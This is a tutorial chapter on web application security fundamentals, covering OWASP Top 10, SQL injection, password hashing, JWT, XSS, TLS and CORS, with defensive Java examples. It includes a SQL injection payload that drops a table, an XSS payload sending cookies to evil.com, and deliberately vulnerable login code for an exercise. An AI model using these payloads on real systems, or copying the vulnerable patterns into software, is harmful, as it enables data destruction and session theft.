# 🔐 Security Fundamentals — Complete Guide

> **Navigation**: [< API Design](07_API_Design_REST.md) | [Index](00_INDEX.md) | [Next: System Design >](09_System_Design.md)

---

# WHY: Why Security Is Non-Negotiable

## The Real Cost

```
Equifax Breach (2017)     → 147 million records leaked → $700M+ settlement
                            Cause: Unpatched Apache Struts vulnerability

Log4Shell (2021)          → Affected MILLIONS of servers worldwide
                            Cause: JNDI injection in log4j library

SolarWinds (2020)         → 18,000 organizations compromised
                            Cause: Compromised CI/CD build pipeline

LESSON: Security is not a feature to add later.
        It's a MINDSET from line 1 of code.
```

---

# WHAT: Core Security Concepts

## Authentication vs Authorization

```
AUTHENTICATION (AuthN) = WHO are you?
  → Login with username/password
  → Show your ID card at the door

AUTHORIZATION (AuthZ) = WHAT can you do?
  → Role-based: Admin can delete, User can only read
  → Show your badge to access the lab

Flow:
  1. User sends credentials (login)
  2. Server AUTHENTICATES → issues token (JWT)
  3. User sends token with every request
  4. Server AUTHORIZES → checks role/permissions for that endpoint
```

## The OWASP Top 10 (2021)

```
#  │ Vulnerability              │ What It Means                    │ Prevention
───┼────────────────────────────┼──────────────────────────────────┼──────────────────
1  │ Broken Access Control      │ User accesses others' data       │ Check permissions EVERY request
2  │ Cryptographic Failures     │ Sensitive data exposed           │ Encrypt at rest + in transit
3  │ Injection                  │ SQL/OS/LDAP injection            │ Parameterized queries, NEVER concat
4  │ Insecure Design            │ Flawed architecture              │ Threat modeling from start
5  │ Security Misconfiguration  │ Default passwords, open ports    │ Harden configs, disable defaults
6  │ Vulnerable Components      │ Outdated libraries with CVEs     │ Dependency scanning (Dependabot)
7  │ Auth Failures              │ Weak passwords, no MFA           │ MFA, rate limiting, strong hashing
8  │ Data Integrity Failures    │ Untrusted deserialization        │ Sign updates, verify integrity
9  │ Logging Failures           │ Can't detect breaches            │ Log security events, monitor alerts
10 │ SSRF                       │ Server makes requests attacker   │ Allowlist URLs, disable redirects
   │                            │ chooses                          │
```

---

# HOW: Securing Applications

## Level 1 — SQL Injection

```java
// ❌ VULNERABLE: String concatenation
String query = "SELECT * FROM users WHERE name = '" + userInput + "'";
// Attack: userInput = "'; DROP TABLE users; --"
// Result: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'

// ✅ SAFE: Parameterized query
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ?"
);
ps.setString(1, userInput);
// Attack input becomes a LITERAL string, not SQL code

// ✅ SAFE: JPA/Hibernate (automatically parameterized)
@Query("SELECT u FROM User u WHERE u.name = :name")
List<User> findByName(@Param("name") String name);
```

## Level 2 — Password Hashing

```java
// NEVER store passwords in plain text!

// ❌ BAD:
user.setPassword(rawPassword);  // stored as "MyPassword123"

// ❌ BAD: MD5/SHA (fast = bad for passwords, crackable)
String hash = DigestUtils.md5Hex(rawPassword);

// ✅ GOOD: BCrypt (slow ON PURPOSE — 100ms per hash)
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12); // 12 rounds
}

// Registration:
String hashed = passwordEncoder.encode("MyPassword123");
// Result: $2a$12$LJ3m4ys3Sn0k7hRA... (60 chars, salted)

// Login verification:
boolean matches = passwordEncoder.matches("MyPassword123", storedHash);

// WHY BCrypt?
// - SLOW (10x per second vs MD5's millions per second)
// - Built-in SALT (same password → different hash each time)
// - COST FACTOR adjustable (increase as hardware gets faster)
```

## Level 3 — JWT (JSON Web Tokens)

```
JWT Structure:
  HEADER.PAYLOAD.SIGNATURE

Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "user42", "role": "ADMIN", "exp": 1709500000}
Signature: HMAC-SHA256(header + "." + payload, SECRET_KEY)

Flow:
  ┌────────┐                           ┌────────┐
  │ Client │ ─── POST /login ──────>   │ Server │
  │        │     {email, password}      │        │
  │        │ <── 200 + JWT token ───    │        │
  │        │                            │        │
  │        │ ─── GET /api/orders ──>    │        │
  │        │     Authorization:         │        │
  │        │     Bearer eyJhbG...       │        │
  │        │ <── 200 + data ────────    │        │
  └────────┘                            └────────┘
```

```java
// Spring Security + JWT Configuration (Spring Boot 3):
@Configuration
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(csrf -> csrf.disable())  // Disable for stateless API
            .sessionManagement(sm -> sm.sessionCreationPolicy(STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)
            .build();
    }
}
```

## Level 4 — XSS (Cross-Site Scripting)

```html
<!-- WHAT: Attacker injects JavaScript into your page -->

<!-- ❌ VULNERABLE: Rendering user input as HTML -->
<div>${userComment}</div>
<!-- Attack: userComment = <script>document.location='http://evil.com/steal?c='+document.cookie</script> -->

<!-- ✅ SAFE: Escape HTML entities -->
<div th:text="${userComment}"></div>  <!-- Thymeleaf auto-escapes -->

Prevention:
  1. NEVER use innerHTML with user data
  2. Use Content-Security-Policy header
  3. Use HttpOnly cookies (JS can't read them)
  4. Sanitize input on server AND client
```

## Level 5 — HTTPS & Encryption

```
HTTP  = Plain text (anyone on the network can read it)
HTTPS = Encrypted with TLS (only client and server can read)

TLS Handshake (simplified):
  1. Client → Server: "Hello, I support these ciphers"
  2. Server → Client: "Let's use this cipher + here's my certificate"
  3. Client verifies certificate with CA
  4. Both sides generate shared SECRET key
  5. All traffic encrypted with that key

Encryption Types:
  SYMMETRIC:  Same key encrypts and decrypts (AES-256) — fast
  ASYMMETRIC: Public key encrypts, private key decrypts (RSA) — slow
  HYBRID:     Use asymmetric to exchange symmetric key (TLS does this)
  HASHING:    One-way function, no decryption (BCrypt, SHA-256)
```

## Level 6 — CORS (Cross-Origin Resource Sharing)

```java
// WHAT: Browser blocks requests from different origins by default
// Your React app (localhost:3000) calling Spring API (localhost:8080)

@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://myapp.com")  // NOT "*" in production!
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("*")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

---

# WHERE: Security Checklist for Every Project

```
INPUT:
  ☐ Validate ALL input (size, type, format, range)
  ☐ Use parameterized queries (NEVER string concatenation)
  ☐ Sanitize output (escape HTML entities)

AUTH:
  ☐ Hash passwords with BCrypt (cost factor ≥ 12)
  ☐ Use JWT with short expiry (15-60 min)
  ☐ Implement refresh tokens
  ☐ Rate limit login attempts (5 per minute)

TRANSPORT:
  ☐ HTTPS everywhere (redirect HTTP → HTTPS)
  ☐ Set security headers (CSP, X-Frame-Options, HSTS)
  ☐ CORS configured for specific origins only

DATA:
  ☐ Encrypt sensitive data at rest (AES-256)
  ☐ Never log passwords, tokens, or PII
  ☐ Use environment variables for secrets (NEVER in code)

DEPENDENCIES:
  ☐ Run dependency scan (Dependabot, Snyk, OWASP DC)
  ☐ Update libraries regularly
  ☐ Remove unused dependencies
```

---

# 🧭 Security Cheat Sheet

```
SQL Injection    → Parameterized queries
XSS              → Escape output, CSP headers
CSRF             → Anti-CSRF tokens (or stateless JWT)
Password Storage → BCrypt (never MD5/SHA)
Auth             → JWT + refresh token
Transport        → HTTPS + HSTS
Secrets          → Environment variables, vault
Dependencies     → Dependabot + regular updates
```

---

# 🏋️ Practice

## Exercise 1: Find the Vulnerabilities
```java
// How many security issues can you spot?
@PostMapping("/login")
public String login(@RequestParam String user, @RequestParam String pass) {
    String sql = "SELECT * FROM users WHERE username='" + user + "' AND password='" + pass + "'";
    ResultSet rs = stmt.executeQuery(sql);
    if (rs.next()) {
        return "Welcome " + user;
    }
    return "Invalid: " + user + "/" + pass;
}
// Answers: (1) SQL injection, (2) plain text password comparison,
//   (3) password in error message, (4) no rate limiting, (5) GET-style params
```

## Exercise 2: Secure a Spring Boot App
```
Build a Spring Boot REST API with:
  - BCrypt password hashing
  - JWT authentication
  - Role-based authorization (USER vs ADMIN)
  - Input validation with @Valid
  - Global exception handler (no stack traces to client)
  - CORS configured for localhost:3000
```

---

> **Next Chapter**: [System Design →](09_System_Design.md)


---

> **Navigation**: [< Previous](07_API_Design_REST.md) | [Back to Index](../00_MASTER_INDEX.md) | [Next >](09_System_Design.md)